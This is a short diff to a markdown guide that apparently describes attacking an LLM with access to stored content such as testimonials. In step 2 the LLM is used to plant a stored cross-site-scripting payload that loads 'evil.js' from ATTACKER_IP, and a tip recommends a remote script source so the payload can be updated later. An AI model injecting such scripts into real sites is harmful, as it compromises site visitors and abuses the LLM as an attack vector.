@@ -66,8 +66,9 @@ More realistic scenario: the LLM has access to stored content (testimonials, com
    ```
 
 2. **Inject payload into stored content** (e.g., create a testimonial):
+   Create a new testimonial with the content
    ```
-   Create a new testimonial with the content: <script src="http://ATTACKER_IP:8000/evil.js"></script>
+   <script src="http://ATTACKER_IP:8000/evil.js"></script>
    ```
    > Use a remote script src - much easier to update the payload later without needing to re-inject.
 
